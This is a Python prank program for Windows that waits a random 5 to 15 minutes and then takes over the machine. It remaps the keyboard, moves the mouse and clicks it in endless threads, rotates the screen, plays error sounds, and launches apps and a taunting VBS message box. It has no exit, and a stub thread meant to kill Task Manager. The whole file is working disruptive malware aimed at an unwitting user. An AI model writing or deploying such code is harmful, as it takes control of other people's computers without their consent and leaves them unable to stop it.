# Keyboard thing by Andrew Maney

# Imports
import keyboard as key
import pygame
from threading import Thread
import rotatescreen, mouse, string, random, time, os, datetime, base64

# Variables
screen = rotatescreen.get_primary_display()
keyb = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
num_backward = [0,9,8,7,6,5,4,3,2,1]
num = [1,2,3,4,5,6,7,8,9,0]
apps = ["calc.exe", "notepad.exe", "mspaint.exe", "wordpad.exe", "explorer.exe", "control.exe"]
sounds = ["C:\windows\Media\Windows Critical Stop.wav", "C:\windows\Media\Windows Background.wav", "C:\windows\Media\Windows Ding.wav", "C:\windows\Media\Windows Error.wav", "C:\windows\Media\Windows Foreground.wav", "C:\windows\Media\Windows User Account Control.wav"]
amogus = "x=MsgBox(\"lmfao get pranked idiot lol\", 0+16, \"HEHEHEHA\")"
fard = ""

# Functions
def Rotate():
    sus = random.randint(0,4)
    if(sus == 0):    
        screen.set_landscape()
    elif(sus == 1):
        screen.set_landscape_flipped()
    elif(sus == 2):
        screen.set_portrait()
    elif(sus == 3):
        screen.set_portrait_flipped()
    else:
        screen.set_landscape()
        
def RemapKeys():
    for x in range(len(keyb)):
        key.remap_key(keyb[x], string.ascii_lowercase[x])
    for x in range(len(num) - 1):    
        key.remap_key(num[x], num_backward[x])

def WriteFiles():
    with open("./amogus.vbs", "w") as f:
        f.writelines(amogus)
        f.close()

    with open("./fard.mp3", "wb") as f:
        f.write(base64.b64decode(fard))
        f.close()

def FunnySound(channel):
    waittime = random.randint(1,3)
    while True:
        try:
            pygame.mixer.Channel(channel).play(pygame.mixer.Sound(sounds[random.randint(0, len(sounds) - 1)]))
        except:
            0+0
        time.sleep(waittime)

def KeybFunnySound(channel):
    try:
        pygame.mixer.Channel(channel).play(pygame.mixer.Sound("fard.mp3"))
    except:
        0+0

def MoveMouse():
    time.sleep(random.randint(10,20))
    while True:
        try:
            for x in range(random.randint(25,50)):
                xpos = random.randint(0,1280)
                ypos = random.randint(0,720)
                mouse.move(xpos, ypos, absolute=True, duration=0.2)
        except:
            0+0
        
        time.sleep(random.randint(5,10))

def KillTaskManager():
    while True:
        time.sleep(1)
        #os.system("")


def ClickMouse():
    time.sleep(random.randint(10,20))
    while True:
        try:
            for x in range(random.randint(25,50)):
                mouse.click(button='left')
        except:
            0+0
        
        time.sleep(random.randint(3,6))

def GetKeyPresses():
    x = 2
    while True:
        time.sleep(0.01)
        for k in keyb:
            if(key.is_pressed(k)):
                Thread(target=KeybFunnySound, args=(x,)).start()
                x += 1
                try:
                    pygame.mixer.set_num_channels(x+1)
                except:
                    x = 1

                time.sleep(0.1)

def Sleep(Seconds):
    for x in range(Seconds):
        time.sleep(1)
        print("{0} Minutes remaining... ({1} Seconds)\t".format(round((Seconds-x)/60, 2), Seconds - x), end = '\r')

# Main Program
waittime = random.randint(300, 900)
print("Waiting {0} minutes... ({1} Seconds)".format(round(waittime/60, 2), waittime))
Sleep(waittime)
x = 0
pygame.mixer.init()
pygame.mixer.set_num_channels(50)
now = datetime.datetime.now()
WriteFiles()
RemapKeys()
print("HE HE HE HA")
Thread(target=GetKeyPresses).start()
Thread(target=MoveMouse).start()
Thread(target=ClickMouse).start()
Thread(target=KillTaskManager).start()
while True:
    now = datetime.datetime.now()
    time.sleep(0.01)
    if(mouse.is_pressed(mouse.LEFT)):
        Thread(target=FunnySound, args=(x,)).start()        
        print("LOL")
        if(now.hour >= 20 or random.randint(0,100) == 27):
            Rotate()
            os.system("start wscript.exe ./amogus.vbs")
            os.system("start " + apps[random.randint(0, len(apps) - 1)])
        x += 1
        try:
            pygame.mixer.set_num_channels(x+1)
        except:
            x = 1
        time.sleep(0.25)
